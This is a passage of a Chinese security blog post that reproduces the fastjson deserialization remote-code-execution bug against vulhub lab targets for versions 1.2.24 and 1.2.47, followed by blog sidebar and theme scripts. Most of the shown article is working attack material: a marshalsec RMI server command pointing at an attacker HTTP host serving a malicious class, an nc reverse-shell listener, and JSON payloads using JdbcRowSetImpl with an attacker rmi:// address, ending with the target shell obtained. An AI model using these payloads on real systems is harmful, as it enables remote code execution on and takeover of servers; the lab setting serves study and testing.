+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230712115005969.png" alt="image-20230712115005969"></p></div><div class="tab-item-content"><p>使用python启动web服务，执行以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 4433</span><br></pre></td></tr></table></figure>
+
+<p>执行成功后结果如下：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230712115341348.png" alt="image-20230712115341348"></p>
+<p>访问页面如下：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230712115403446.png" alt="image-20230712115403446"></p></div><div class="tab-item-content"><p>启动http服务之后，启动rmi服务器</p>
+<p>在marshalsec的目录下执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://192.168.74.130:4433/#Shell&quot;</span> 9999</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>注意：引号那里是根据你开启的http服务器的IP和构造的恶意类决定的。例如你开启HTTP服务的IP是192.168.3.39，端口是6677，构造的恶意类的类名是AABB，那么你的RMI执行远程代码的地址就是：<code>http://192.168.3.39:6677/#AABB</code></p>
+</blockquote>
+<p>执行完成后显示如下信息即表示开启成功：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230712120233757.png" alt="image-20230712120233757"></p></div><div class="tab-item-content"><p>在你代码中反弹shell的那个IP对应的电脑上输入如下命令来监听端口：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 7178</span><br></pre></td></tr></table></figure>
+
+<p>执行成功后会显示如下信息：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230712120416565.png" alt="image-20230712120416565"></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>
+
+
+
+<h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p>刷新靶机页面<code>http://你靶机的ip:8090</code>并用burp抓包，将数据包进行修改：</p>
+<ul>
+<li>将请求方法改成POST</li>
+<li>添加如下json数据：</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Content-Type<span class="punctuation">:</span> application/json</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">168</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://192.168.74.130:9999/Shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：rmi的地址改成部署的rmi的IP和端口</p>
+</blockquote>
+<p>响应结果如下：</p>
+<div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">rmi日志</button><button type="button" class="tab">http日志</button><button type="button" class="tab">nc监听</button></div><div class="tab-contents"><div class="tab-item-content active"><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230713175230686.png" alt="image-20230713175230686"></p></div><div class="tab-item-content"><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230713175450748.png" alt="image-20230713175450748"></p></div><div class="tab-item-content"><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230713175517054.png" alt="image-20230713175517054"></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>
+
+<p>可以看到，已经拿到目标服务器的shell了。</p>
+<h2 id="1-2-47版本"><a href="#1-2-47版本" class="headerlink" title="1.2.47版本"></a>1.2.47版本</h2><p>步骤还是一样的，只不过靶机的目录不一样了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/fastjson/1.2.47-rce/</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230713180615788.png" alt="image-20230713180615788"></p>
+<p>进入目录之后执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>开启之后，访问<code>http://开启靶机的ip地址:8090</code>即可访问靶机页面</p>
+<blockquote>
+<p>上面的步骤几乎一样，这里就跳过了</p>
+</blockquote>
+<p>只需要在修改包的时候把构造的数据修改成下面的数据即可：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Content-Type<span class="punctuation">:</span> application/json</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">168</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://192.168.32.136:9999/Shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>发送成功后，监听的端口依然能够getshell：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230713182328478.png" alt="image-20230713182328478"></p>
+<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>本文参考文章：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://juejin.cn/post/6846687594130964488">https://juejin.cn/post/6846687594130964488</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/Bossfrank/article/details/130100893">https://blog.csdn.net/Bossfrank/article/details/130100893</a></p>
+</li>
+</ul>
+<p>不同版本fastjson的绕过利用文章(写的很详细)：</p>
+<ul>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.freebuf.com/vuls/361576.html">https://www.freebuf.com/vuls/361576.html</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener external nofollow noreferrer" href="https://xiaoyu-lane-github.io">云麒火翎_落辰星</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xiaoyu-lane.github.io/stcs/2023/07/e08e901851f2/">https://xiaoyu-lane.github.io/stcs/2023/07/e08e901851f2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://xiaoyu-lane.github.io" target="_blank">云麒火翎_落辰星</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="../../../../tags/%E6%B8%97%E9%80%8F/">渗透</a><a class="post-meta__tags" href="../../../../tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="../../../../tags/fastjson/">fastjson</a><a class="post-meta__tags" href="../../../../tags/Java%E6%BC%8F%E6%B4%9E/">Java漏洞</a><a class="post-meta__tags" href="../../../../tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></div><div class="post-share"><div class="social-share" data-image="../../../../images/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq,copy_link"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="../3146666c304a/" title="RMI反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">RMI反序列化</div></div><div class="info-2"><div class="info-item-1">前言在复现fastjson的过程中看到rmi、LDAP等机制的使用，但一直模模糊糊搞不懂，想来搞清楚这些东西。 所以，得先弄清楚RMI等前置知识点再复现fastjson的漏洞，这样能帮助我们更好的理解fastjson漏洞的原理。 概念RMI(远程方法调用，Remote Method Invocation)，在Java中， 使用Java调用远程的Java程序就是RMI来进行操作的。它大大增强了Java开发分布式应用的效率，它是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。 Java本身对RMI规范的实现默认是使用JRMP协议，而在Weblogic中对RMI规范的实现使用的是T3协议。  JRMP: Java Remote Message Protocol，Java远程消息交换协议。在Java中，...</div></div></div></a><a class="pagination-related" href="../5dfcbb92c2c0/" title="fastjson漏洞不出网利用"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">fastjson漏洞不出网利用</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="../5dfcbb92c2c0/" title="fastjson漏洞不出网利用"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-19</div><div class="info-item-2">fastjson漏洞不出网利用</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="../3146666c304a/" title="RMI反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-03</div><div class="info-item-2">RMI反序列化</div></div><div class="info-2"><div class="info-item-1">前言在复现fastjson的过程中看到rmi、LDAP等机制的使用，但一直模模糊糊搞不懂，想来搞清楚这些东西。 所以，得先弄清楚RMI等前置知识点再复现fastjson的漏洞，这样能帮助我们更好的理解fastjson漏洞的原理。 概念RMI(远程方法调用，Remote Method Invocation)，在Java中， 使用Java调用远程的Java程序就是RMI来进行操作的。它大大增强了Java开发分布式应用的效率，它是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。 Java本身对RMI规范的实现默认是使用JRMP协议，而在Weblogic中对RMI规范的实现使用的是T3协议。  JRMP: Java Remote Message Protocol，Java远程消息交换协议。在Java中，...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="../images/avatar.jpg" onerror="this.onerror=null;this.src='../img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">云麒火翎_落辰星</div><div class="author-info-description">一个啥都不会的菜鸟</div><div class="site-data"><a href="../archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="../tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="../categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/XiaoYu-lane"><i class="fab fa-github"></i><span>github主页</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/XiaoYu-lane" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">命由心造，运由势成</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFfastjson"><span class="toc-number">1.1.</span> <span class="toc-text">什么是fastjson</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">什么是序列化和反序列化</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AutoType"><span class="toc-number">2.</span> <span class="toc-text">AutoType</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">2.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8E%9F%E5%9B%A0"><span class="toc-number">2.2.</span> <span class="toc-text">使用原因</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Egetter%E5%92%8Csetter"><span class="toc-number">2.2.1.</span> <span class="toc-text">基于getter和setter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8AutoType"><span class="toc-number">2.2.2.</span> <span class="toc-text">使用AutoType</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-24%E7%89%88%E6%9C%AC"><span class="toc-number">4.1.</span> <span class="toc-text">1.2.24版本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E9%9D%B6%E6%9C%BA"><span class="toc-number">4.1.1.</span> <span class="toc-text">开启靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E5%91%BD%E4%BB%A4%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">4.1.2.</span> <span class="toc-text">搭建执行恶意命令的服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">4.1.3.</span> <span class="toc-text">反弹 shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-47%E7%89%88%E6%9C%AC"><span class="toc-number">4.2.</span> <span class="toc-text">1.2.47版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E5%B0%BE"><span class="toc-number">4.3.</span> <span class="toc-text">结尾</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="2025/05/eb16ed253297/" title="云淇火翎网络安全攻防平台">云淇火翎网络安全攻防平台</a><time datetime="2025-05-08T16:47:29.000Z" title="发表于 2025-05-09 00:47:29">2025-05-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../stcs/2023/07/5dfcbb92c2c0/" title="fastjson漏洞不出网利用">fastjson漏洞不出网利用</a><time datetime="2023-07-19T07:59:28.000Z" title="发表于 2023-07-19 15:59:28">2023-07-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../stcs/2023/07/e08e901851f2/" title="fastjson反序列化漏洞">fastjson反序列化漏洞</a><time datetime="2023-07-09T02:21:02.000Z" title="发表于 2023-07-09 10:21:02">2023-07-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../stcs/2023/07/3146666c304a/" title="RMI反序列化">RMI反序列化</a><time datetime="2023-07-03T05:45:55.000Z" title="发表于 2023-07-03 13:45:55">2023-07-03</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/images/background.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By 云麒火翎_落辰星</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div><div class="footer_custom_text">农业社会人是农业品，工业社会人是工业品，人不学习，那就是消耗品</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="../../../../js/utils.js"></script><script src="../../../../js/main.js"></script><script src="../../../../js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const applyThemeDefaultsConfig = theme => {
+    if (theme === 'dark-mode') {
+      Chart.defaults.color = "rgba(255, 255, 255, 0.8)"
+      Chart.defaults.borderColor = "rgba(255, 255, 255, 0.2)"
+      Chart.defaults.scale.ticks.backdropColor = "transparent"
+    } else {
+      Chart.defaults.color = "rgba(0, 0, 0, 0.8)"
+      Chart.defaults.borderColor = "rgba(0, 0, 0, 0.1)"
+      Chart.defaults.scale.ticks.backdropColor = "transparent"
+    }
+  }
+
+  // Recursively traverse the config object and automatically apply theme-specific color schemes
+  const applyThemeConfig = (obj, theme) => {
+    if (typeof obj !== 'object' || obj === null) return
+
+    Object.keys(obj).forEach(key => {
+      const value = obj[key]
+      // If the property is an object and has theme-specific options, apply them
+      if (typeof value === 'object' && value !== null) {
+        if (value[theme]) {
+          obj[key] = value[theme] // Apply the value for the current theme
+        } else {
+          // Recursively process child objects
+          applyThemeConfig(value, theme)
+        }
+      }
+    })
+  }
+
+  const runChartJS = ele => {
+    window.loadChartJS = true
+
+    Array.from(ele).forEach((item, index) => {
+      const chartSrc = item.firstElementChild
+      const chartID = item.getAttribute('data-chartjs-id') || ('chartjs-' + index) // Use custom ID or default ID
+      const width = item.getAttribute('data-width')
+      const existingCanvas = document.getElementById(chartID)
+
+      // If a canvas already exists, remove it to avoid rendering duplicates
+      if (existingCanvas) {
+          existingCanvas.parentNode.remove()
+      }
+
+      const chartDefinition = chartSrc.textContent
+      const canvas = document.createElement('canvas')
+      canvas.id = chartID
+
+      const div = document.createElement('div')
+      div.className = 'chartjs-wrap'
+
+      if (width) {
+        div.style.width = width
+      }
+
+      div.appendChild(canvas)
+      chartSrc.insertAdjacentElement('afterend', div)
+
+      const ctx = document.getElementById(chartID).getContext('2d')
+
+      const config = JSON.parse(chartDefinition)
+
+      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark-mode' : 'light-mode'
+
+      // Set default styles (initial setup)
+      applyThemeDefaultsConfig(theme)
+
+      // Automatically traverse the config and apply dual-mode color schemes
+      applyThemeConfig(config, theme)
+
+      new Chart(ctx, config)
+    })
+  }
+
+  const loadChartJS = () => {
+    const chartJSEle = document.querySelectorAll('#article-container .chartjs-container')
+    if (chartJSEle.length === 0) return
+
+    window.loadChartJS ? runChartJS(chartJSEle) : btf.getScript('https://cdn.jsdelivr.net/npm/chart.js/dist/chart.umd.min.js').then(() => runChartJS(chartJSEle))
+  }
+
+  // Listen for theme change events
+  btf.addGlobalFn('themeChange', loadChartJS, 'chartjs')
+  btf.addGlobalFn('encrypt', loadChartJS, 'chartjs')
+
+  window.pjax ? loadChartJS() : document.addEventListener('DOMContentLoaded', loadChartJS)
+})()</script><script>(function() {
+  const abcjsInit = function() {
+    const abcjsFn = function() {
+      setTimeout(function() {
+        const sheets = document.querySelectorAll(".abc-music-sheet")
+        for (let i = 0; i < sheets.length; i++) {
+          const ele = sheets[i]
+          if (ele.children.length > 0) continue
+
+          // Parse parameters from data-params attribute
+          let params = {}
+          const dp = ele.getAttribute("data-params")
+          if (dp) {
+            try {
+              params = JSON.parse(dp)
+            } catch (e) {
+              console.error("Failed to parse data-params:", e)
+            }
+          }
+
+          // Merge parsed parameters with the responsive option
+          // Ensures params content appears before responsive
+          const options = { ...params, responsive: "resize" }
+
+          // Render the music score using ABCJS.renderAbc
+          ABCJS.renderAbc(ele, ele.innerHTML, options)
+        }
+      }, 100)
+    }
+
+    if (typeof ABCJS === "object") {
+      abcjsFn()
+    } else {
+      btf.getScript("https://cdn.jsdelivr.net/npm/abcjs/dist/abcjs-basic-min.min.js").then(abcjsFn)
+    }
+  }
+
+  if (window.pjax) {
+    abcjsInit()
+  } else {
+    window.addEventListener("load", abcjsInit)
+  }
+
+  btf.addGlobalFn("encrypt", abcjsInit, "abcjs")
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = {"emojiCDN":"//i0.hdslb.com/bfs/emote/"}
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'GMc79VSJM9kREs5BmnGEnKPh-gzGzoHsz',
+      appKey: 'ZJgnFT3oY9aZzQ2wtNhERIWj',
+      avatar: 'retro',
+      serverURLs: '',
+      emojiMaps: {"tv_doge":"6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png","tv_亲亲":"a8111ad55953ef5e3be3327ef94eb4a39d535d06.png","tv_偷笑":"bb690d4107620f1c15cff29509db529a73aee261.png","tv_再见":"180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png","tv_冷漠":"b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png","tv_发怒":"34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png","tv_发财":"34db290afd2963723c6eb3c4560667db7253a21a.png","tv_可爱":"9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png","tv_吐血":"09dd16a7aa59b77baa1155d47484409624470c77.png","tv_呆":"fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png","tv_呕吐":"9f996894a39e282ccf5e66856af49483f81870f3.png","tv_困":"241ee304e44c0af029adceb294399391e4737ef2.png","tv_坏笑":"1f0b87f731a671079842116e0991c91c2c88645a.png","tv_大佬":"093c1e2c490161aca397afc45573c877cdead616.png","tv_大哭":"23269aeb35f99daee28dda129676f6e9ea87934f.png","tv_委屈":"d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png","tv_害羞":"a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png","tv_尴尬":"7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png","tv_微笑":"70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png","tv_思考":"90cf159733e558137ed20aa04d09964436f618a1.png","tv_惊吓":"0d15c7e2ee58e935adc6a7193ee042388adc22af.png"},
+      visitor: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
